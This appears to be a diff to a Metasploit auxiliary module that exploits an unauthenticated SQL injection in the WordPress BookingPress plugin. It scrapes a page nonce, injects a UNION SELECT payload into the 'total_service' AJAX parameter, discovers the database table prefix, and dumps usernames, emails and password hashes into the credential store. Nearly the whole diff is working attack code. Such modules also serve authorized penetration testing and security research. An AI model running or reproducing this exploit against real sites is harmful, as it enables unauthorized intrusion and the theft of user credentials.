@@ -5,11 +5,18 @@
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
-  include Msf::Exploit::SQLi
+  include Msf::Exploit::Remote::HTTP::Wordpress::SQLi
   prepend Msf::Exploit::Remote::AutoCheck
 
   NONCE_NOT_FOUND_ERROR_MSG = 'Unable to get wp-nonce as an unauthenticated user'.freeze
-  GET_SQLI_OBJECT_FAILED_ERROR_MSG = 'Unable to successfully retrieve an SQLi object'.freeze
+  class RequestError < StandardError
+    attr_reader :failure
+
+    def initialize(failure, message)
+      @failure = failure
+      super(message)
+    end
+  end
 
   def initialize(info = {})
     super(
@@ -52,19 +59,23 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check
-    @nonce = get_user_nonce
-    return Exploit::CheckCode::Unknown(NONCE_NOT_FOUND_ERROR_MSG) if @nonce == NONCE_NOT_FOUND_ERROR_MSG
-
-    @sqli = get_sqli_object
-    return Exploit::CheckCode::Unknown(GET_SQLI_OBJECT_FAILED_ERROR_MSG) if @sqli == GET_SQLI_OBJECT_FAILED_ERROR_MSG
+    prepare_sqli
     return Exploit::CheckCode::Vulnerable('SQL injection test succeeded') if @sqli.test_vulnerable
 
     Exploit::CheckCode::Safe('SQL injection test did not succeed')
+  rescue RequestError => e
+    e.failure == Failure::NotVulnerable ? Exploit::CheckCode::Safe(e.message) : Exploit::CheckCode::Unknown(e.message)
+  rescue URI::InvalidURIError, Msf::OptionValidateError => e
+    elog('Invalid BookingPress URL configuration', error: e)
+    Exploit::CheckCode::Unknown('BookingPress URL configuration is invalid')
+  rescue Rex::ConnectionError, Rex::TimeoutError, OpenSSL::SSL::SSLError => e
+    elog('BookingPress SQL injection check failed to connect', error: e)
+    Exploit::CheckCode::Unknown('BookingPress request failed to connect or complete')
   end
 
   def generate_vars_post(sqli)
     {
-      'action' => 'bookingpress_front_get_category_services', # Vulnerable AJAX action
+      'action' => 'bookingpress_front_get_category_services',
       '_wpnonce' => @nonce,
       'category_id' => 1,
       'total_service' => "#{rand(100..10000)}#{sqli}"
@@ -72,69 +83,128 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_sqli_object
-    create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true }) do |payload|
-      res = send_request_cgi({
+    create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true, encoder: :hex, safe: true }) do |payload|
+      # UNION SELECT needs no FROM table, so the probe works before discovering
+      # the installation's actual WordPress database prefix.
+      res = send_request_cgi(
         'method' => 'POST',
-        'uri' => normalize_uri('/wp-admin/admin-ajax.php'),
-        'vars_post' =>
-            generate_vars_post(") UNION ALL SELECT (#{payload}),456,789,12,34,56,78,90,77 from wp_users-- -")
-      })
-
-      if res && res.code == 200
-        json_doc = res.get_json_document
-        if json_doc.blank? || json_doc[0].blank?
-          print_error('Could not parse the JSON response returned from the SQLi attempt!')
-          return GET_SQLI_OBJECT_FAILED_ERROR_MSG
-        end
-
-        json_parsed_doc = json_doc[0]['bookingpress_service_id']
-        if json_parsed_doc.blank?
-          print_error('Was able to parse the JSON response but no bookingpress_service_id field was found!')
-          return GET_SQLI_OBJECT_FAILED_ERROR_MSG
-        end
-
-        json_parsed_doc
-      elsif res
-        print_error("Unexpected response code encountered when conducting the SQLi attempt: #{res.code}")
-        return GET_SQLI_OBJECT_FAILED_ERROR_MSG
-      else
-        print_error('No response from SQLi attempt')
-        return GET_SQLI_OBJECT_FAILED_ERROR_MSG
+        'uri' => @ajax_uri,
+        'vars_post' => generate_vars_post(") UNION ALL SELECT (#{payload}),456,789,12,34,56,78,90,77-- -")
+      )
+      raise RequestError.new(Failure::Unreachable, 'BookingPress SQL request did not receive a response') unless res
+      if [401, 403].include?(res.code)
+        raise RequestError.new(Failure::NoAccess, "BookingPress SQL request was denied (HTTP #{res.code})")
       end
+      raise RequestError.new(Failure::UnexpectedReply, "BookingPress SQL request returned HTTP #{res.code}") unless res.code == 200
+
+      document = res.get_json_document
+      if document.is_a?(Hash) && document['variant'] == 'error'
+        raise RequestError.new(Failure::NoAccess, 'BookingPress rejected the SQL request; the nonce may have expired')
+      end
+      unless document.is_a?(Array)
+        raise RequestError.new(Failure::UnexpectedReply, 'BookingPress SQL response was not a service-result array')
+      end
+
+      if document.empty?
+        next nil if @query_operation == :prefix
+
+        failure = @query_operation == :dump ? Failure::UnexpectedReply : Failure::NotVulnerable
+        raise RequestError.new(failure, 'SQL injection test did not return a result')
+      end
+      row = document.first
+      unless row.is_a?(Hash) && row.key?('bookingpress_service_id')
+        raise RequestError.new(Failure::UnexpectedReply, 'BookingPress SQL response did not include a service ID')
+      end
+
+      value = row['bookingpress_service_id']
+      # A missing table in a scalar subquery produces SQL NULL. Prefix
+      # discovery must receive nil, not empty text coerced to indicator zero.
+      if value.nil? || value == ''
+        next nil unless @query_operation == :dump
+
+        raise RequestError.new(Failure::UnexpectedReply, 'BookingPress user extraction returned an empty scalar')
+      end
+      unless value.is_a?(String) || value.is_a?(Integer)
+        raise RequestError.new(Failure::UnexpectedReply, 'BookingPress SQL response included an invalid service ID')
+      end
+
+      value.to_s
     end
   end
 
   def get_user_nonce
-    res = send_request_cgi({
-      'method' => 'POST',
-      'uri' => normalize_uri(datastore['TARGETURI'])
-    })
+    page = URI.join(full_uri('/'), target_uri.to_s)
+    raise RequestError.new(Failure::BadConfig, 'TARGETURI must identify an HTTP booking page') unless page.is_a?(URI::HTTP)
 
-    return NONCE_NOT_FOUND_ERROR_MSG unless res&.body&.match("_wpnonce:'(\\w+)'\\s*};")
+    res = send_request_cgi('method' => 'POST', 'uri' => page.request_uri)
+    raise RequestError.new(Failure::Unreachable, 'BookingPress booking page did not receive a response') unless res
+    if [401, 403].include?(res.code)
+      raise RequestError.new(Failure::NoAccess, "BookingPress booking page was denied (HTTP #{res.code})")
+    end
+    raise RequestError.new(Failure::UnexpectedReply, "BookingPress booking page returned HTTP #{res.code}") unless res.code == 200
 
-    ::Regexp.last_match(1)
+    scripts = res.get_html_document.css('script').map(&:text).join("\n")
+    nonce = scripts[/\b_wpnonce\s*:\s*['"](\w+)['"]/, 1]
+    raise RequestError.new(Failure::UnexpectedReply, NONCE_NOT_FOUND_ERROR_MSG) unless nonce
+
+    # This is embedded JSON, not the HTTP response document. WordPress may
+    # advertise another canonical host; only use its path on our configured
+    # HTTP transport, never follow a page-supplied host.
+    settings = scripts[/\b(?:var|let|const)\s+appoint_ajax_obj\s*=\s*({.*?})\s*;/m, 1]
+    config = settings && JSON.parse(settings)
+    unless config.is_a?(Hash) && config['ajax_url'].is_a?(String)
+      raise RequestError.new(Failure::UnexpectedReply, 'BookingPress booking page did not include AJAX settings')
+    end
+
+    ajax = URI.join(page.to_s, config['ajax_url'])
+    unless ajax.is_a?(URI::HTTP) && ajax.path.end_with?('/wp-admin/admin-ajax.php')
+      raise RequestError.new(Failure::UnexpectedReply, 'BookingPress booking page included an invalid AJAX endpoint')
+    end
+
+    @ajax_uri = ajax.request_uri
+    nonce
+  rescue JSON::ParserError => e
+    elog('Invalid BookingPress embedded AJAX settings', error: e)
+    raise RequestError.new(Failure::UnexpectedReply, 'BookingPress booking page returned invalid AJAX settings')
   end
 
   def run
-    # next line included for automatic inclusion into vulnerable plugins list
-    # check_plugin_version_from_readme('bookingpress', '1.0.12')
-    @nonce ||= get_user_nonce
-    fail_with(Failure::UnexpectedReply, NONCE_NOT_FOUND_ERROR_MSG) if @nonce == NONCE_NOT_FOUND_ERROR_MSG
-    @sqli ||= get_sqli_object
-    fail_with(Failure::UnexpectedReply, GET_SQLI_OBJECT_FAILED_ERROR_MSG) if @sqli == GET_SQLI_OBJECT_FAILED_ERROR_MSG
+    # Machine-consumed by tools/dev/update_wordpress_vulnerabilities.rb.
+    # check_plugin_version_from_readme('bookingpress-appointment-booking', '1.0.11')
+    prepare_sqli
+    raise RequestError.new(Failure::NotVulnerable, 'SQL injection test did not succeed') unless @sqli.test_vulnerable
 
-    creds_table = Rex::Text::Table.new(
-      'Header' => 'Wordpress User Credentials',
-      'Indent' => 1,
-      'Columns' => ['Username', 'Email', 'Hash']
-    )
+    @query_operation = :prefix
+    @prefix = wordpress_sqli_identify_table_prefix
+    unless @prefix.is_a?(String) && @prefix.match?(/\A[a-zA-Z0-9_]+\z/)
+      raise RequestError.new(Failure::UnexpectedReply, 'Unable to identify the WordPress database table prefix')
+    end
 
     print_status('Extracting credential information')
-    users = @sqli.dump_table_fields('wp_users', %w[user_login user_email user_pass])
+    @query_operation = :dump
+    users = @sqli.dump_table_fields("#{@prefix}users", %w[user_login user_email user_pass])
+    unless users.is_a?(Array)
+      raise RequestError.new(Failure::UnexpectedReply, 'BookingPress did not return WordPress user rows')
+    end
 
-    users.each do |(username, email, hash)|
+    users = users.map do |row|
+      unless row.is_a?(Array) && row.length == 3 && row.all? { |field| field.is_a?(String) }
+        raise RequestError.new(Failure::UnexpectedReply, 'BookingPress returned a malformed WordPress user row')
+      end
+
+      row.map do |field|
+        text = field.dup.force_encoding(::Encoding::UTF_8)
+        raise RequestError.new(Failure::UnexpectedReply, 'BookingPress returned invalid UTF-8 user data') unless text.valid_encoding?
+
+        text
+      end
+    end
+    creds_table = Rex::Text::Table.new('Header' => 'Wordpress User Credentials', 'Indent' => 1, 'Columns' => ['Username', 'Email', 'Hash'])
+    users.each do |username, email, hash|
       creds_table << [username, email, hash]
-      create_credential({
+      next if hash.empty?
+
+      create_credential(
         workspace_id: myworkspace_id,
         origin_type: :service,
         module_fullname: fullname,
@@ -143,13 +213,42 @@ class MetasploitModule < Msf::Auxiliary
         jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),
         private_data: hash,
         service_name: 'WordPress BookingPress Plugin',
-        address: datastore['RHOSTS'],
-        port: datastore['RPORT'],
+        address: rhost,
+        port: rport,
         protocol: 'tcp',
         status: Metasploit::Model::Login::Status::UNTRIED,
         email: email
-      })
+      )
     end
-    print_line creds_table.to_s
+    print_line(creds_table.to_s)
+  rescue RequestError => e
+    case e.failure
+    when Failure::Unreachable
+      fail_with(Failure::Unreachable, e.message)
+    when Failure::NoAccess
+      fail_with(Failure::NoAccess, e.message)
+    when Failure::NotVulnerable
+      fail_with(Failure::NotVulnerable, e.message)
+    when Failure::BadConfig
+      fail_with(Failure::BadConfig, e.message)
+    else
+      fail_with(Failure::UnexpectedReply, e.message)
+    end
+  rescue URI::InvalidURIError, Msf::OptionValidateError => e
+    elog('Invalid BookingPress URL configuration', error: e)
+    fail_with(Failure::BadConfig, 'BookingPress URL configuration is invalid')
+  rescue Rex::ConnectionError, Rex::TimeoutError, OpenSSL::SSL::SSLError => e
+    elog('BookingPress credential collection failed to connect', error: e)
+    fail_with(Failure::Unreachable, 'BookingPress request failed to connect or complete')
+  end
+
+  private
+
+  def prepare_sqli
+    # Never reuse a nonce, endpoint or callback from an earlier target/run.
+    @nonce = @ajax_uri = @sqli = @prefix = nil
+    @query_operation = :probe
+    @nonce = get_user_nonce
+    @sqli = get_sqli_object
   end
 end
